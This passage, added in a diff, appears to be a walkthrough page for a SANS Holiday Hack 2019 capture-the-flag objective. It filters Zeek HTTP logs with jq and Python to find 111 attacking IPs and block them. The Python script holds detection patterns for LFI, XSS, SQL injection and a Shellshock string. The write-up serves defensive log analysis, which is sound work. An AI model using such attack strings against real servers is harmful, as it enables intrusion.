+<div class="codehilite"><pre><span></span><span class="k">while</span> <span class="nv">IFS</span><span class="o">=</span> <span class="nb">read</span> -r line<span class="p">;</span> <span class="k">do</span>
+      cat http.log <span class="p">|</span> jq --arg ua <span class="nv">$line</span> <span class="s1">&#39;.[] | select(.user_agent == $ua ) | .[&quot;id.orig_h&quot;] &#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq
+<span class="k">done</span> &lt; pivot_useragents.txt <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">|</span> tr -d <span class="s1">&#39;&quot;&#39;</span> <span class="p">&amp;</span>&gt;&gt; detected_ips_clean.csv
+</pre></div>
+
+<blockquote>
+<p><code>IFS= read -r line</code> to read file line by line.</p>
+</blockquote>
+<p>Remove all ips duplicates and count the results.
+<div class="codehilite"><pre><span></span>cat detected_ips_clean.csv <span class="p">|</span> sort <span class="p">|</span> uniq &gt; detected_ips_final.csv
+
+cat detected_ips_final.csv <span class="p">|</span> wc -l
+</pre></div></p>
+<details class="note"><summary>Unique malicious ip list 111</summary><div class="codehilite"><pre><span></span>0.216.249.31,1.185.21.112,10.155.246.29,102.143.16.184,103.235.93.133,104.179.109.113,106.132.195.153,106.93.213.219,111.81.145.191,116.116.98.205,118.196.230.170,118.26.57.38,121.7.186.163,123.127.233.97,129.121.121.48,13.39.153.254,131.186.145.73,132.45.187.177,135.203.243.43,135.32.99.116,140.60.154.239,142.128.135.10,148.146.134.52,150.45.133.97,150.50.77.238,155.129.97.35,158.171.84.209,168.66.108.62,169.242.54.5,173.37.160.150,180.57.20.247,185.19.7.133,186.28.46.179,187.152.203.243,187.178.169.123,19.235.69.221,190.245.228.38,193.228.194.36,194.143.151.224,2.230.60.70,2.240.116.254,200.75.228.240,203.68.29.5,211.229.3.254,217.132.156.225,22.34.153.164,220.132.33.81,223.149.180.133,225.191.220.138,226.102.56.13,226.240.188.154,227.110.45.126,229.133.163.235,229.229.189.246,23.49.177.78,23.79.123.99,230.246.50.221,231.179.108.238,233.74.78.199,238.143.78.114,249.237.77.152,249.34.9.16,249.90.116.138,25.80.197.172,250.22.86.40,250.51.219.47,252.122.243.212,253.182.102.55,253.65.40.39,254.140.181.172,27.88.56.114,28.169.41.122,29.0.183.220,31.116.232.143,31.254.228.4,32.168.17.54,33.132.98.193,34.129.179.28,34.155.174.167,37.216.249.50,42.103.246.250,42.127.244.30,42.191.112.181,44.164.136.41,44.74.106.131,45.239.232.245,48.66.193.176,49.161.8.58,50.154.111.0,52.39.201.107,53.160.218.44,56.5.47.137,6.144.27.227,61.110.82.125,65.153.114.120,66.116.147.181,68.115.251.76,69.221.145.150,72.183.132.206,75.215.214.65,75.73.228.192,79.198.89.109,80.244.147.207,81.14.204.154,83.0.8.119,84.147.231.129,84.185.44.166,9.206.212.33,9.95.128.208,95.166.116.45,97.220.93.190
+</pre></div>
+
+</details>
+<p>We have now <mark>111</mark> unique malicious ips in our blacklist.</p>
+<hr />
+<h3 id="blocking-the-malicious-ips">Blocking the malicious ips<a class="headerlink" href="#blocking-the-malicious-ips" title="Permanent link">&para;</a></h3>
+<p>Add <code>,</code> after each ip to convert to csv format</p>
+<div class="codehilite"><pre><span></span>cat detected_ips_clean.csv <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span>
+</pre></div>
+
+<p>Copy the result to the Firewall:</p>
+<p><img alt="obj12-3" src="../images/obj12/3.png" /></p>
+<div class="admonition success">
+<p class="admonition-title">Route Calculation Success!</p>
+<p>RID: <code>0807198508261964</code></p>
+</div>
+<div class="admonition done">
+<p class="admonition-title">Congratulations! You have completed the Filter Out Poisoned Sources of Weather Data challenge!</p>
+</div>
+<details class="note"><summary>Alternative Method</summary><p>We could use python to filter the ips from the logs:</p>
+<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">json</span>
+
+
+<span class="c1"># Searching for the attacks</span>
+<span class="c1">#LFI</span>
+<span class="n">lfi_detects</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;..&quot;</span><span class="p">,</span><span class="s2">&quot;/etc&quot;</span><span class="p">,</span><span class="s2">&quot;||&quot;</span><span class="p">,</span><span class="s2">&quot;pass&quot;</span><span class="p">]</span>
+
+<span class="c1">#XSS</span>
+<span class="n">xss_detects</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;&lt;&quot;</span><span class="p">]</span>
+
+<span class="c1">#Shellshock</span>
+<span class="n">ss_detects</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;() { :; };&quot;</span><span class="p">]</span>
+
+<span class="c1">#SQLi</span>
+<span class="n">sqli_detects</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;/*&quot;</span><span class="p">,</span><span class="s2">&quot;**&quot;</span><span class="p">,</span><span class="s2">&quot;UNION&quot;</span><span class="p">,</span><span class="s2">&quot;&#39;&quot;</span><span class="p">]</span>
+
+<span class="c1">#list of status_msg</span>
+<span class="n">status_msgs</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;Bad Request&quot;</span><span class="p">]</span>
+
+<span class="c1"># list of malicious user agents  to pivot from the file we generated</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;pivot_useragents.txt&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">ua_blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">]</span>
+
+<span class="c1"># list of malicious ips</span>
+<span class="n">blacklist</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
+
+<span class="c1"># load logs</span>
+<span class="n">http_logs</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s2">&quot;http.log&quot;</span><span class="p">))</span>
+
+<span class="c1"># iterate over entries and filter based on identified markers of IoC</span>
+<span class="k">for</span> <span class="n">log</span> <span class="ow">in</span> <span class="n">http_logs</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">detect</span> <span class="ow">in</span> <span class="n">lfi_detects</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">detect</span> <span class="ow">in</span> <span class="n">log</span><span class="p">[</span><span class="s1">&#39;uri&#39;</span><span class="p">]</span> <span class="ow">and</span> <span class="n">log</span><span class="p">[</span><span class="s1">&#39;id.orig_h&#39;</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">:</span>
+            <span class="n">blacklist</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">log</span><span class="p">[</span><span class="s1">&#39;id.orig_h&#39;</span><span class="p">])</span>
+
+    <span class="k">for</span> <span class="n">detect</span> <span class="ow">in</span> <span class="n">xss_detects</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">detect</span> <span class="ow">in</span> <span class="n">log</span><span class="p">[</span><span class="s1">&#39;uri&#39;</span><span class="p">]</span> <span class="ow">or</span> <span class="n">detect</span> <span class="ow">in</span> <span class="n">log</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span>  <span class="ow">and</span> <span class="n">log</span><span class="p">[</span><span class="s1">&#39;id.orig_h&#39;</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">:</span>
+            <span class="n">blacklist</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">log</span><span class="p">[</span><span class="s1">&#39;id.orig_h&#39;</span><span class="p">])</span>
+
+    <span class="k">for</span> <span class="n">detect</span> <span class="ow">in</span> <span class="n">ss_detects</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">detect</span> <span class="ow">in</span> <span class="n">log</span><span class="p">[</span><span class="s1">&#39;user_agent&#39;</span><span class="p">]</span>  <span class="ow">and</span> <span class="n">log</span><span class="p">[</span><span class="s1">&#39;id.orig_h&#39;</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">:</span>
+            <span class="n">blacklist</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">log</span><span class="p">[</span><span class="s1">&#39;id.orig_h&#39;</span><span class="p">])</span>
+
+    <span class="k">for</span> <span class="n">detect</span> <span class="ow">in</span> <span class="n">sqli_detects</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">detect</span> <span class="ow">in</span> <span class="n">log</span><span class="p">[</span><span class="s1">&#39;uri&#39;</span><span class="p">]</span> <span class="ow">or</span> <span class="n">detect</span> <span class="ow">in</span> <span class="n">log</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span> <span class="ow">or</span> <span class="n">detect</span> <span class="ow">in</span> <span class="n">log</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>  <span class="ow">or</span> <span class="n">detect</span> <span class="ow">in</span> <span class="n">log</span><span class="p">[</span><span class="s1">&#39;user_agent&#39;</span><span class="p">]</span> <span class="ow">and</span> <span class="n">log</span><span class="p">[</span><span class="s1">&#39;id.orig_h&#39;</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">:</span>
+            <span class="n">blacklist</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">log</span><span class="p">[</span><span class="s1">&#39;id.orig_h&#39;</span><span class="p">])</span>
+
+    <span class="k">for</span> <span class="n">message</span> <span class="ow">in</span> <span class="n">status_msgs</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">message</span> <span class="ow">in</span> <span class="n">log</span><span class="p">[</span><span class="s1">&#39;status_msg&#39;</span><span class="p">]</span>  <span class="ow">and</span> <span class="n">log</span><span class="p">[</span><span class="s1">&#39;id.orig_h&#39;</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">blacklist</span> <span class="p">:</span>
+            <span class="n">blacklist</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">log</span><span class="p">[</span><span class="s1">&#39;id.orig_h&#39;</span><span class="p">])</span>
+
+    <span class="k">for</span> <span class="n">ua</span> <span class="ow">in</span> <span class="n">ua_blacklist</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">ua</span> <span class="ow">in</span> <span class="n">log</span><span class="p">[</span><span class="s1">&#39;user_agent&#39;</span><span class="p">]</span> <span class="ow">and</span> <span class="n">log</span><span class="p">[</span><span class="s1">&#39;id.orig_h&#39;</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">:</span>
+            <span class="n">blacklist</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">log</span><span class="p">[</span><span class="s1">&#39;id.orig_h&#39;</span><span class="p">])</span>
+
+<span class="c1"># print how many ips we got</span>
+<span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">blacklist</span><span class="p">))</span>
+
+<span class="c1"># print ips blacklist and add `,` after each ip to convert to csv format</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">blacklist</span><span class="p">))</span>
+</pre></div>
+
+</details>
+<hr />
+<h2 id="what-youve-learned">🎓 What you've learned<a class="headerlink" href="#what-youve-learned" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Zeek logs json format and content</li>
+<li>Search in Zeek logs using <code>jq</code> tool</li>
+<li>Pivoting based on results like UserAgents</li>
+<li>Knowing different malicious UserAgents</li>
+<li>Using <code>sort</code>, <code>uniq</code>, <code>tr</code>, <code>wc</code> commands</li>
+</ul>
+<hr />
+<div class="footnote">
+<hr />
+<ol>
+<li id="fn:1">
+<p><a href="https://docs.zeek.org/en/stable/scripts/base/protocols/http/main.zeek.html#type-HTTP::Info">https://docs.zeek.org/en/stable/scripts/base/protocols/http/main.zeek.html#type-HTTP::Info</a>&#160;<a class="footnote-backref" href="#fnref:1" title="Jump back to footnote 1 in the text">&#8617;</a></p>
+</li>
+<li id="fn:2">
+<p><a href="https://cheatsheetseries.owasp.org/">https://cheatsheetseries.owasp.org/</a>&#160;<a class="footnote-backref" href="#fnref:2" title="Jump back to footnote 2 in the text">&#8617;</a><a class="footnote-backref" href="#fnref2:2" title="Jump back to footnote 2 in the text">&#8617;</a><a class="footnote-backref" href="#fnref3:2" title="Jump back to footnote 2 in the text">&#8617;</a></p>
+</li>
+<li id="fn:3">
+<p><a href="https://www.crowdstrike.com/blog/mitigating-bash-shellshock/">https://www.crowdstrike.com/blog/mitigating-bash-shellshock/</a></p>
+<p><a href="https://metalkey.github.io/shellshock-explained--exploitation-tutorial.html">https://metalkey.github.io/shellshock-explained--exploitation-tutorial.html</a>&#160;<a class="footnote-backref" href="#fnref:3" title="Jump back to footnote 3 in the text">&#8617;</a><a class="footnote-backref" href="#fnref2:3" title="Jump back to footnote 3 in the text">&#8617;</a></p>
+</li>
+<li id="fn:4">
+<p><a href="https://www.sans.org/reading-room/whitepapers/malicious/user-agent-field-analyzing-detecting-abnormal-malicious-organization-33874">https://www.sans.org/reading-room/whitepapers/malicious/user-agent-field-analyzing-detecting-abnormal-malicious-organization-33874</a></p>
+<p><a href="https://www-users.cs.umn.edu/~zhan3248/materials/technical_report.pdf">https://www-users.cs.umn.edu/~zhan3248/materials/technical_report.pdf</a></p>
+<p><a href="https://user-agents.net/lookup">https://user-agents.net/lookup</a></p>
+<p><a href="http://useragentstring.com/index.php">http://useragentstring.com/index.php</a></p>
+<p><a href="https://www.giac.org/paper/gcia/8443/60-seconds-wire-malicious-traffic/123928">https://www.giac.org/paper/gcia/8443/60-seconds-wire-malicious-traffic/123928</a></p>
+<p><a href="https://rules.emergingthreats.net/open/snort-2.9.0/rules/emerging-user_agents.rules">https://rules.emergingthreats.net/open/snort-2.9.0/rules/emerging-user_agents.rules</a>&#160;<a class="footnote-backref" href="#fnref:4" title="Jump back to footnote 4 in the text">&#8617;</a></p>
+</li>
+<li id="fn:5">
+<p><a href="https://httpstatuses.com/400">https://httpstatuses.com/400</a>&#160;<a class="footnote-backref" href="#fnref:5" title="Jump back to footnote 5 in the text">&#8617;</a></p>
+</li>
+<li id="fn:6">
+<p><a href="https://threatpoint.checkpoint.com/ThreatPortal/threat?threatId=11021&amp;threatType=malwarefamily">https://threatpoint.checkpoint.com/ThreatPortal/threat?threatId=11021&amp;threatType=malwarefamily</a>&#160;<a class="footnote-backref" href="#fnref:6" title="Jump back to footnote 6 in the text">&#8617;</a></p>
+</li>
+<li id="fn:7">
+<p><a href="https://attack.mitre.org/software/S0070/">https://attack.mitre.org/software/S0070/</a></p>
+<p><a href="https://www.secureworks.com/research/threat-group-3390-targets-organizations-for-cyberespionage">https://www.secureworks.com/research/threat-group-3390-targets-organizations-for-cyberespionage</a>&#160;<a class="footnote-backref" href="#fnref:7" title="Jump back to footnote 7 in the text">&#8617;</a></p>
+</li>
+<li id="fn:8">
+<p><a href="https://github.com/NextronSystems/APTSimulator">https://github.com/NextronSystems/APTSimulator</a>&#160;<a class="footnote-backref" href="#fnref:8" title="Jump back to footnote 8 in the text">&#8617;</a></p>
+</li>
+<li id="fn:9">
+<p><a href="https://github.com/Neo23x0/sigma/blob/master/rules/proxy/proxy_ua_malware.yml">https://github.com/Neo23x0/sigma/blob/master/rules/proxy/proxy_ua_malware.yml</a></p>
+<p><a href="https://github.com/seanlinmt/suricata/blob/master/files/rules/emerging-user_agents.rules">https://github.com/seanlinmt/suricata/blob/master/files/rules/emerging-user_agents.rules</a></p>
+<p><a href="https://networkraptor.blogspot.com/p/user-agent-strings.html">https://networkraptor.blogspot.com/p/user-agent-strings.html</a>&#160;<a class="footnote-backref" href="#fnref:9" title="Jump back to footnote 9 in the text">&#8617;</a><a class="footnote-backref" href="#fnref2:9" title="Jump back to footnote 9 in the text">&#8617;</a></p>
+</li>
+<li id="fn:10">
+<p><a href="https://doc.emergingthreats.net/2002079">https://doc.emergingthreats.net/2002079</a></p>
+<p><a href="https://www.webmasterworld.com/search_engine_spiders/4809958.htm">https://www.webmasterworld.com/search_engine_spiders/4809958.htm</a></p>
+<p><a href="http://useragentstring.com/index.php?id=5363">http://useragentstring.com/index.php?id=5363</a>&#160;<a class="footnote-backref" href="#fnref:10" title="Jump back to footnote 10 in the text">&#8617;</a><a class="footnote-backref" href="#fnref2:10" title="Jump back to footnote 10 in the text">&#8617;</a></p>
+</li>
+<li id="fn:11">
+<p><a href="https://doc.emergingthreats.net/2004114">https://doc.emergingthreats.net/2004114</a>&#160;<a class="footnote-backref" href="#fnref:11" title="Jump back to footnote 11 in the text">&#8617;</a></p>
+</li>
+<li id="fn:12">
+<p><a href="https://docs.google.com/spreadsheets/d/1mY6BGYZgwPH3UiVAdxU4Hraa9n1gFLXSMcR_5mhs0GE/edit#gid=1694348953">https://docs.google.com/spreadsheets/d/1mY6BGYZgwPH3UiVAdxU4Hraa9n1gFLXSMcR_5mhs0GE/edit#gid=1694348953</a>&#160;<a class="footnote-backref" href="#fnref:12" title="Jump back to footnote 12 in the text">&#8617;</a></p>
+</li>
+<li id="fn:13">
+<p><a href="https://www.spywareremove.com/removeAntiVirXP08.html">https://www.spywareremove.com/removeAntiVirXP08.html</a>&#160;<a class="footnote-backref" href="#fnref:13" title="Jump back to footnote 13 in the text">&#8617;</a></p>
+</li>
+<li id="fn:14">
+<p><a href="https://community.rsa.com/thread/185439">https://community.rsa.com/thread/185439</a></p>
+<p><a href="https://github.com/Neo23x0/sigma/blob/master/rules/proxy/proxy_ua_malware.yml">https://github.com/Neo23x0/sigma/blob/master/rules/proxy/proxy_ua_malware.yml</a>&#160;<a class="footnote-backref" href="#fnref:14" title="Jump back to footnote 14 in the text">&#8617;</a></p>
+</li>
+<li id="fn:15">
+<p><a href="https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/fareit">https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/fareit</a></p>
+<p><a href="https://github.com/Neo23x0/sigma/blob/master/rules/proxy/proxy_ua_malware.yml">https://github.com/Neo23x0/sigma/blob/master/rules/proxy/proxy_ua_malware.yml</a>&#160;<a class="footnote-backref" href="#fnref:15" title="Jump back to footnote 15 in the text">&#8617;</a><a class="footnote-backref" href="#fnref2:15" title="Jump back to footnote 15 in the text">&#8617;</a></p>
+</li>
+<li id="fn:16">
+<p><a href="https://app.any.run/tasks/7d7fa4a0-6970-4428-828b-29572abf9ceb/">https://app.any.run/tasks/7d7fa4a0-6970-4428-828b-29572abf9ceb/</a>&#160;<a class="footnote-backref" href="#fnref:16" title="Jump back to footnote 16 in the text">&#8617;</a></p>
+</li>
+</ol>
+</div>
+                
+                  
+                
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../objective11/" title="11 Open the Sleigh Shop Door" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                11  Open the Sleigh Shop Door
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../../helptheelves/challenge1/" title="Escape Ed" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                Escape Ed
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; 2019 Santa NP
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+  <div class="md-footer-social">
+    <link rel="stylesheet" href="../../assets/fonts/font-awesome.css">
+    
+      <a href="https://twitter.com/salaheldinaz" class="md-footer-social__link fa fa-twitter"></a>
+    
+      <a href="https://salaheldin.online" class="md-footer-social__link fa fa-ra"></a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.808e90bb.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
+      
+        <script src="../../javascripts/asciinema-player.js"></script>
+      
+    
+  </body>
+</html>
